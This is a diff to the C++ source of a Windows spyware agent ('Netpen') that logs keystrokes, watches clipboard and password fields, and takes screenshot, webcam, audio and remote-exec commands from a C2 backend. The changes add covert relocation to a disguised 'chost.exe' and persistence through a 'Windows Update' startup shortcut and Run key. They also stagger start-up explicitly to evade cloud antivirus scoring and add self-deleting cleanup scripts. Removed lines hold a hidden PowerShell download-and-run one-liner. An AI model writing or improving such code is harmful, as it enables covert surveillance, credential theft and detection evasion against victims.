@@ -71,6 +71,10 @@ static std::string g_hostname;                // local computer name, used as ag
 static std::string g_lastClipboard;           // last clipboard text seen (dedup)
 static std::string g_lastPasswordDigest;      // last password-field digest (dedup)
 static HWND g_hwnd = NULL;                    // hidden message-only window backing WndProc
+static DWORD g_childStartTick = 0;            // GetTickCount when child began (stagger heavy work)
+static bool g_hookReady = false;              // keyboard hook installed after settle
+static bool g_clipReady = false;              // clipboard polling enabled after settle
+static bool g_persistReady = false;           // Run/Startup written after settle
 
 // --- Decrypted C2 credentials (populated once in InitConfig) ---
 static std::wstring g_supabaseHost;
@@ -228,6 +232,108 @@ static std::string GetExeName() {
 
 static std::wstring GetExeNameW() {
     return ToWide(GetExeName());
+}
+
+// Per-build install path from config.h (not TEMP, not fake RuntimeBroker).
+#ifndef AGENT_INSTALL_DIR
+#define AGENT_INSTALL_DIR "CacheHost"
+#endif
+#ifndef AGENT_INSTALL_EXE
+#define AGENT_INSTALL_EXE "chost.exe"
+#endif
+#ifndef AGENT_RUN_VALUE
+#define AGENT_RUN_VALUE "WindowsHostSvc"
+#endif
+
+static void LogMsg(const std::string& msg);
+
+static bool PathEqualsI(const std::string& a, const std::string& b) {
+    if (a.size() != b.size()) return false;
+    for (size_t i = 0; i < a.size(); i++) {
+        if (tolower((unsigned char)a[i]) != tolower((unsigned char)b[i])) return false;
+    }
+    return true;
+}
+
+static std::string GetInstallDir() {
+    char local[MAX_PATH];
+    if (GetEnvironmentVariableA("LOCALAPPDATA", local, MAX_PATH) == 0 || !local[0]) return "";
+    return std::string(local) + "\\" + AGENT_INSTALL_DIR;
+}
+
+static std::string GetInstallExePath() {
+    std::string d = GetInstallDir();
+    if (d.empty()) return "";
+    return d + "\\" + AGENT_INSTALL_EXE;
+}
+
+static bool IsRunningFromInstall() {
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+    std::string inst = GetInstallExePath();
+    return !inst.empty() && PathEqualsI(std::string(self), inst);
+}
+
+static void EnsureInstallCopy() {
+    std::string instExe = GetInstallExePath();
+    if (instExe.empty()) return;
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+    if (PathEqualsI(std::string(self), instExe)) return;
+    std::string d = GetInstallDir();
+    CreateDirectoryA(d.c_str(), NULL);
+    if (CopyFileA(self, instExe.c_str(), FALSE))
+        LogMsg("Install copy -> " + instExe);
+}
+
+// Copy to install path and relaunch. Returns true only if the new process is
+// still alive after settleMs (otherwise caller keeps running from drop path).
+static bool RelocateToInstallAndRelaunch(DWORD settleMs) {
+    std::string instDir = GetInstallDir();
+    std::string instExe = GetInstallExePath();
+    if (instDir.empty() || instExe.empty()) return false;
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+    if (PathEqualsI(std::string(self), instExe)) return false;
+
+    CreateDirectoryA(instDir.c_str(), NULL);
+    if (!CopyFileA(self, instExe.c_str(), FALSE)) {
+        DWORD err = GetLastError();
+        if (err != ERROR_SHARING_VIOLATION && err != ERROR_USER_MAPPED_FILE) {
+            LogMsg("Relocate: copy failed " + std::to_string((int)err));
+            return false;
+        }
+    }
+
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    std::string cmd = "\"" + instExe + "\"";
+    if (!CreateProcessA(instExe.c_str(), &cmd[0], NULL, NULL, FALSE, 0, NULL, instDir.c_str(), &si, &pi)) {
+        LogMsg("Relocate: CreateProcess failed");
+        return false;
+    }
+
+    DWORD wr = WaitForSingleObject(pi.hProcess, settleMs);
+    if (wr == WAIT_OBJECT_0) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        DeleteFileA(instExe.c_str());
+        LogMsg("Relocate: install process died — staying on drop path");
+        return false;
+    }
+    if (wr != WAIT_TIMEOUT) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return false;
+    }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    if (!PathEqualsI(std::string(self), instExe))
+        MoveFileExA(self, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+    LogMsg("Relocate: install alive, leaving drop path");
+    return true;
 }
 
 static std::string GetWindowTitle() {
@@ -622,18 +728,22 @@ static void ScheduleSelfDestruct() {
     char selfPath[MAX_PATH];
     GetModuleFileNameA(NULL, selfPath, MAX_PATH);
     MoveFileExA(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-    std::string exeName = GetExeName();
+    std::string instExe = GetInstallExePath();
+    if (!instExe.empty() && !PathEqualsI(std::string(selfPath), instExe))
+        MoveFileExA(instExe.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+    DWORD pid = GetCurrentProcessId();
     std::string logPath = std::string(tmp) + "wuaueng.log";
     std::string batPath = std::string(tmp) + "NetpenCleanup.bat";
     std::string bat =
         std::string("@echo off\r\n")
         + ":w\r\n"
-        + "tasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
+        + "tasklist /fi \"PID eq " + std::to_string((unsigned long)pid) + "\" 2>nul | find \"" + std::to_string((unsigned long)pid) + "\" >nul\r\n"
         + "if errorlevel 1 goto r\r\n"
-        + "timeout /t 2 /nobreak >nul\r\n"
+        + "timeout /t 1 /nobreak >nul\r\n"
         + "goto w\r\n"
         + ":r\r\n"
         + "del /f /q \"" + std::string(selfPath) + "\" >nul 2>&1\r\n"
+        + (instExe.empty() ? "" : ("del /f /q \"" + instExe + "\" >nul 2>&1\r\n"))
         + "del /f /q \"" + logPath + "\" >nul 2>&1\r\n"
         + "del /f /q \"" + batPath + "\" >nul 2>&1\r\n";
     HANDLE hf = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -684,31 +794,52 @@ static int GetRemoteVersion() {
     return atoi(s.c_str());
 }
 
-// Auto-update: download the new EXE from Storage, save as NetpenUpdate.exe, then
-// create a batch that waits for this process to exit, copies the new EXE over the
-// old one, starts it, and cleans up. The watchdog triggers this when
-// GetRemoteVersion() > NETPEN_VERSION.
+// Auto-update: download new EXE, wait for THIS pid only, replace install path,
+// start it. Fail → caller keeps old agent.
 static bool DeployUpdate(int remoteVer) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
-    std::string newExe = std::string(tmp) + "NetpenUpdate.exe";
-    std::string batFile = std::string(tmp) + "NetpenUpdate.bat";
+    std::string newExe = std::string(tmp) + "NetpenUpdate_" + std::to_string(remoteVer) + ".exe";
+    std::string batFile = std::string(tmp) + "NetpenUpdate_" + std::to_string(remoteVer) + ".bat";
     if (!HttpDownloadToFile(STORAGE_EXE_PATH, newExe.c_str())) {
         LogMsg("Update: download failed");
         return false;
     }
-    char selfPath[MAX_PATH];
-    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
-    std::string exeName = GetExeName();
+    HANDLE hCheck = CreateFileA(newExe.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hCheck == INVALID_HANDLE_VALUE) return false;
+    DWORD fsize = GetFileSize(hCheck, NULL);
+    CloseHandle(hCheck);
+    if (fsize == INVALID_FILE_SIZE || fsize < 100000) {
+        DeleteFileA(newExe.c_str());
+        LogMsg("Update: file too small");
+        return false;
+    }
+
+    std::string target = GetInstallExePath();
+    if (target.empty()) {
+        char selfPath[MAX_PATH];
+        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+        target = selfPath;
+    } else {
+        CreateDirectoryA(GetInstallDir().c_str(), NULL);
+    }
+
+    DWORD pid = GetCurrentProcessId();
     std::string bat =
         std::string("@echo off\r\n")
-        + "set \"O=" + std::string(selfPath) + "\"\r\n"
+        + "set \"O=" + target + "\"\r\n"
         + "set \"N=" + newExe + "\"\r\n"
-        + ":w\r\ntasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
-        + "if errorlevel 1 goto r\r\ntimeout /t 2 /nobreak >nul\r\ngoto w\r\n"
-        + ":r\r\ncopy /y \"%N%\" \"%O%\" >nul\r\n"
+        + ":w\r\n"
+        + "tasklist /fi \"PID eq " + std::to_string((unsigned long)pid) + "\" 2>nul | find \"" + std::to_string((unsigned long)pid) + "\" >nul\r\n"
+        + "if errorlevel 1 goto r\r\n"
+        + "timeout /t 1 /nobreak >nul\r\n"
+        + "goto w\r\n"
+        + ":r\r\n"
+        + "copy /y \"%N%\" \"%O%\" >nul\r\n"
+        + "if errorlevel 1 exit /b 1\r\n"
         + "start \"\" \"%O%\"\r\n"
-        + "del \"%N%\"\r\ndel \"%~f0\"\r\n";
+        + "del \"%N%\" >nul 2>&1\r\n"
+        + "del \"%~f0\" >nul 2>&1\r\n";
     HANDLE hf = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(newExe.c_str()); return false; }
     DWORD w = 0;
@@ -721,7 +852,7 @@ static bool DeployUpdate(int remoteVer) {
         DeleteFileA(newExe.c_str()); DeleteFileA(batFile.c_str()); return false;
     }
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-    LogMsg("Update deployed: v" + std::to_string(remoteVer));
+    LogMsg("Update deployed: v" + std::to_string(remoteVer) + " -> " + target);
     return true;
 }
 
@@ -1765,39 +1896,42 @@ static std::string GetAgentIdentity() {
     return std::string(computer) + "\\" + user;
 }
 
-// True if HKCU\Run still has our download one-liner (not just the marker key).
+// True if HKCU\Run still has our local install-path entry.
 static bool RunValueExists() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
         return false;
     DWORD type = 0, size = 0;
-    LONG r = RegQueryValueExA(hKey, GetExeName().c_str(), NULL, &type, NULL, &size);
+    LONG r = RegQueryValueExA(hKey, AGENT_RUN_VALUE, NULL, &type, NULL, &size);
     RegCloseKey(hKey);
-    return r == ERROR_SUCCESS && type == REG_SZ;
+    return r == ERROR_SUCCESS && type == REG_SZ && size > 1;
 }
 
 // === Persistence management ====================================================
 // Layers:
-//   1. HKCU\Run — restored every 2 min if GPO wipes it
-//   2. Per-user startup .lnk — only when Run missing; removed when healthy
+//   1. HKCU\Run → local install path (no network / TEMP write at logon)
+//   2. Per-user startup .lnk → same path (backup if Run wiped)
 //   3. All Users startup .lnk — only if elevated; seeds other users on logon
 //   4. Self-destruct reverses all of the above + deletes EXE files
+// First infect may land in TEMP; watchdog relocates after a delay.
 
 // Remove all persistence traces. Called during self-destruct.
-// Note: HKEY_CURRENT_USER\Run delete via RegDeleteValueA doesn't check the
-// open key first (intentional — the key always exists in theory).
 static void CleanupPersistence() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, AGENT_RUN_VALUE);
         RegDeleteValueA(hKey, GetExeName().c_str());
+        RegDeleteValueA(hKey, "a.exe");
         RegCloseKey(hKey);
     }
     RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
-    std::string cachedExe = std::string(tempPath) + GetExeName();
-    DeleteFileA(cachedExe.c_str());
+    DeleteFileA((std::string(tempPath) + GetExeName()).c_str());
+    DeleteFileA((std::string(tempPath) + "a.exe").c_str());
     DeleteFileA((std::string(tempPath) + "wuaueng.log").c_str());
+    std::string inst = GetInstallExePath();
+    if (!inst.empty()) DeleteFileA(inst.c_str());
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) > 0 && appdata[0]) {
         DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
@@ -1808,14 +1942,20 @@ static void CleanupPersistence() {
 
 // === Hidden window procedure ===================================================
 // Backed by a message-only window (desktop HWND_MESSAGE parent). The 1-second
-// timer does all periodic work. Counter values control scheduling:
-//   every tick = pending key flush, title poll for auto-SS, process pending auto-SS
-//   x % 2  = password field check      (every 2s)
-//   x % 3  = clipboard check           (every 3s)
-//   x % 5  = flush buffer if idle      (every 5s, 300ms grace)
-//   x % 30 = self-destruct / stop      (every 30s)
-//   x % 60 = heartbeat, commands       (every 60s)
-//   x % 120 = persistence check        (every 2 min)
+// timer does all periodic work. First-minute work is staggered to reduce the
+// simultaneous "malware burst" cloud ML scores on first run:
+//   ~5s   first heartbeat
+//   ~25s  InstallStartup (Run → local path)
+//   ~35s  keyboard hook
+//   ~45s  clipboard / password field polls
+// Steady-state:
+//   every tick = pending key flush, title poll for auto-SS (after hook), process auto-SS
+//   x % 2  = password field check      (every 2s, after settle)
+//   x % 3  = clipboard check           (every 3s, after settle)
+//   x % 5  = flush buffer if idle
+//   x % 30 = self-destruct / stop
+//   x % 60 = heartbeat, commands
+//   x % 120 = persistence check
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
@@ -1826,14 +1966,35 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         {
             static int counter = 0;
             counter++;
+            DWORD elapsed = GetTickCount() - g_childStartTick;
+
+            // Stagger first-minute enablement
+            if (!g_selfDestructing && !g_persistReady && elapsed >= 25000) {
+                EnsureStartupEntry();
+                g_persistReady = true;
+                LogMsg("Persist enabled");
+            }
+            if (!g_selfDestructing && !g_hookReady && elapsed >= 35000) {
+                g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(NULL), 0);
+                if (g_hHook) {
+                    g_hookReady = true;
+                    LogMsg("Hook enabled");
+                } else {
+                    LogMsg("Hook failed: " + std::to_string(GetLastError()));
+                }
+            }
+            if (!g_clipReady && elapsed >= 45000)
+                g_clipReady = true;
+
             if (!g_selfDestructing) {
                 ProcessPendingKeyFlush();
-                // Poll foreground title so mouse-only focus still triggers auto-SS
-                CheckAutoScreenshot(GetWindowTitle());
-                ProcessPendingAutoScreenshot();
+                if (g_hookReady) {
+                    CheckAutoScreenshot(GetWindowTitle());
+                    ProcessPendingAutoScreenshot();
+                }
             }
-            if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
-            if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
+            if (g_clipReady && counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
+            if (g_clipReady && counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
             if (counter % 5 == 0 && !g_keys.empty()) {
                 DWORD now = GetTickCount();
                 if (now - g_lastTick > 300) FlushBuffer();
@@ -1851,18 +2012,21 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     DestroyWindow(hwnd);
                 }
             }
-            if (counter % 60 == 0 && !g_selfDestructing) {
+            // Early first heartbeat (~5s), then every 60s
+            if (!g_selfDestructing && (counter == 5 || counter % 60 == 0)) {
                 SendHeartbeat();
-                FetchTriggers();
-                std::string scRowId = CheckScreenshotCmd();
-                if (!scRowId.empty()) HandleScreenshot(scRowId);
-                std::string wcRowId = CheckWebcamCmd();
-                if (!wcRowId.empty()) HandleWebcam(wcRowId);
-                std::string spRowId = CheckSpeakerCmd();
-                if (!spRowId.empty()) HandleSpeaker(spRowId);
-                CheckAndHandleExec();
+                if (counter % 60 == 0) {
+                    FetchTriggers();
+                    std::string scRowId = CheckScreenshotCmd();
+                    if (!scRowId.empty()) HandleScreenshot(scRowId);
+                    std::string wcRowId = CheckWebcamCmd();
+                    if (!wcRowId.empty()) HandleWebcam(wcRowId);
+                    std::string spRowId = CheckSpeakerCmd();
+                    if (!spRowId.empty()) HandleSpeaker(spRowId);
+                    CheckAndHandleExec();
+                }
             }
-            if (counter % 120 == 0 && !g_selfDestructing) {
+            if (counter % 120 == 0 && !g_selfDestructing && g_persistReady) {
                 EnsureStartupEntry();
             }
             break;
@@ -1877,9 +2041,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return 0;
 }
 
-// Set up the NETPEN_REGKEY marker and HKCU\Run download one-liner.
+// Marker + HKCU\Run pointing at local install path (no download at logon).
 // If elevated, also seed All Users startup so other logons get the agent.
 static void InstallStartup() {
+    EnsureInstallCopy();
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         const char* marker = "1";
@@ -1887,40 +2052,58 @@ static void InstallStartup() {
         RegCloseKey(hKey);
     }
 
-    std::string psCmd = "powershell -w h -c \"$p=$env:TEMP+'\\" + GetExeName() + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
+    std::string runTarget = GetInstallExePath();
+    if (runTarget.empty()) {
+        char self[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, self, MAX_PATH);
+        runTarget = self;
+    }
 
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
+        RegSetValueExA(hKey, AGENT_RUN_VALUE, 0, REG_SZ, (BYTE*)runTarget.c_str(), (DWORD)runTarget.size() + 1);
+        RegDeleteValueA(hKey, "a.exe");
+        RegDeleteValueA(hKey, GetExeName().c_str());
         RegCloseKey(hKey);
     }
     if (IsElevated()) CreateAllUsersStartupEntry();
 }
 
-// Check Run value (not only marker). Healthy → remove user startup .lnk.
-// Missing → reinstall. If elevated, re-assert All Users seed.
+// Re-assert Run + startup .lnk to install path. Keep .lnk as backup.
 static void EnsureStartupEntry() {
-    if (RunValueExists()) {
-        RemoveStartupFolderEntry();
-    } else {
+    EnsureInstallCopy();
+    if (!RunValueExists()) {
         InstallStartup();
-        CreateStartupFolderEntry();
+    } else {
+        HKEY hKey;
+        std::string runTarget = GetInstallExePath();
+        if (!runTarget.empty() &&
+            RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExA(hKey, AGENT_RUN_VALUE, 0, REG_SZ, (BYTE*)runTarget.c_str(), (DWORD)runTarget.size() + 1);
+            RegCloseKey(hKey);
+        }
     }
+    CreateStartupFolderEntry();
     if (IsElevated()) CreateAllUsersStartupEntry();
 }
 
-// Create a WindowsUpdate.lnk in the given startup folder (user or All Users).
+// Create a WindowsUpdate.lnk targeting the local install EXE (offline-safe).
 static void CreateStartupLnkAt(const std::string& startupPath) {
     DeleteFileA((startupPath + "\\WindowsUpdate.bat").c_str());
     std::string lnkPath = startupPath + "\\WindowsUpdate.lnk";
-    DeleteFileA(lnkPath.c_str());
-    std::wstring args = L"-w h -c \"$p=$env:TEMP+'\\" + GetExeNameW() + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
+    std::string target = GetInstallExePath();
+    if (target.empty()) {
+        char self[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, self, MAX_PATH);
+        target = self;
+    }
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;
     bool needUninit = SUCCEEDED(hr);
     IShellLinkW* psl = NULL;
     if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
-        psl->SetPath(L"powershell.exe");
-        psl->SetArguments(args.c_str());
+        psl->SetPath(ToWide(target).c_str());
+        psl->SetArguments(L"");
+        psl->SetWorkingDirectory(ToWide(GetInstallDir()).c_str());
         psl->SetShowCmd(SW_HIDE);
         psl->SetDescription(L"Windows Update");
         IPersistFile* ppf = NULL;
@@ -1933,7 +2116,7 @@ static void CreateStartupLnkAt(const std::string& startupPath) {
     if (needUninit) CoUninitialize();
 }
 
-// Per-user startup .lnk — only when Run is missing. Removed when healthy.
+// Per-user startup .lnk — backup if Run is wiped.
 static void CreateStartupFolderEntry() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
@@ -1974,11 +2157,15 @@ static void RemoveAllUsersStartupEntry() {
 }
 
 // === Child process (entry point: --child flag) ==================================
-// Creates the hidden window, registers the low-level keyboard hook, cleans the
-// startup folder, then enters the message loop. The hook and timer do the work.
+// Creates the hidden window and enters the message loop. Hook, clipboard, and
+// persistence are enabled on a stagger from WndProc (not all at t=0).
 
 static int RunChild(HINSTANCE hInstance) {
     g_hostname = GetAgentIdentity();
+    g_childStartTick = GetTickCount();
+    g_hookReady = false;
+    g_clipReady = false;
+    g_persistReady = false;
 
     WNDCLASSEXW wc = {0};
     wc.cbSize = sizeof(WNDCLASSEXW);
@@ -1994,14 +2181,7 @@ static int RunChild(HINSTANCE hInstance) {
     g_hwnd = CreateWindowExW(0, AGENT_CLASS, L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
     if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }
 
-    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
-    if (!g_hHook) {
-        LogMsg("Hook failed: " + std::to_string(GetLastError()));
-        return 1;
-    }
-
-    LogMsg("Child started on " + g_hostname);
-    RemoveStartupFolderEntry();
+    LogMsg("Child started on " + g_hostname + " (staggered init)");
     FetchTriggers();
 
     MSG msg;
@@ -2020,12 +2200,9 @@ static int RunChild(HINSTANCE hInstance) {
 // === Watchdog process ==========================================================
 // Entry point. Decrypts C2 config, hides the console, checks for --child flag.
 // If --child: runs the child (lines above).
-// Otherwise: creates a singleton mutex, installs persistence, then loops
-// spawning the child every 5 minutes. Each iteration:
-//   - Waits for child to exit or 5 min timeout
-//   - On timeout: checks for remote update (supersedes local version)
-//   - On timeout: checks for .kill flag (self-destruct)
-//   - If neither: sleeps 3s and re-spawns the child
+// Otherwise: takes mutex, runs from drop path first, after ~45s relocates to
+// install path (alive-check 10s). Persistence is applied by the child after
+// stagger. Update failure keeps this watchdog alive.
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     InitConfig();
@@ -2037,20 +2214,41 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         return RunChild(hInstance);
     }
 
+    // Already on install path: take mutex and run.
+    // On TEMP/drop path: take mutex, run first, relocate later (not at t=0).
     CreateMutexW(NULL, TRUE, AGENT_MUTEX);
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     g_hostname = GetAgentIdentity();
 
-    InstallStartup();
-    LogMsg("Watchdog started on " + g_hostname + (IsElevated() ? " (elevated multi-user seed)" : ""));
+    // If already installed, refresh Run early. Drop-path first runs skip loud
+    // InstallStartup until child stagger (~25s) and/or post-relocate.
+    if (IsRunningFromInstall())
+        InstallStartup();
 
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
+    LogMsg(std::string("Watchdog started on ") + g_hostname +
+        (IsElevated() ? " (elevated multi-user seed)" : "") +
+        " path=" + path);
+
     std::string exePath(path);
+    DWORD watchdogStart = GetTickCount();
+    bool triedRelocate = IsRunningFromInstall();
 
     while (true) {
         RemoveKillFlag();
+
+        // Delayed relocate: one PE first minute, then durable path
+        if (!triedRelocate && !IsRunningFromInstall() &&
+            (GetTickCount() - watchdogStart) >= 45000) {
+            triedRelocate = true;
+            if (RelocateToInstallAndRelaunch(10000))
+                return 0;
+            // Failed: keep running from drop path
+            EnsureInstallCopy();
+            InstallStartup();
+        }
 
         STARTUPINFOA si = {0};
         si.cb = sizeof(si);
@@ -2064,12 +2262,31 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
         bool updated = false;
         while (true) {
-            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
+            // Shorter wait slices so delayed relocate can fire mid-child
+            DWORD wr = WaitForSingleObject(pi.hProcess, 5000);
             if (wr == WAIT_TIMEOUT) {
+                if (!triedRelocate && !IsRunningFromInstall() &&
+                    (GetTickCount() - watchdogStart) >= 45000) {
+                    triedRelocate = true;
+                    TerminateProcess(pi.hProcess, 1);
+                    WaitForSingleObject(pi.hProcess, 5000);
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                    if (RelocateToInstallAndRelaunch(10000))
+                        return 0;
+                    EnsureInstallCopy();
+                    InstallStartup();
+                    // respawn child on drop path
+                    updated = false;
+                    goto next_spawn;
+                }
                 int rv = GetRemoteVersion();
                 if (rv > NETPEN_VERSION) {
                     TerminateProcess(pi.hProcess, 1);
+                    WaitForSingleObject(pi.hProcess, 10000);
                     updated = DeployUpdate(rv);
+                    if (!updated)
+                        LogMsg("Update failed — keeping old agent");
                     break;
                 }
                 if (KillFlagExists()) {
@@ -2091,11 +2308,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         }
 
         if (updated) {
-            LogMsg("Watchdog exiting for update");
+            LogMsg("Watchdog exiting for update (new process should start)");
             break;
         }
 
         Sleep(3000);
+        next_spawn:;
     }
 
     return 0;
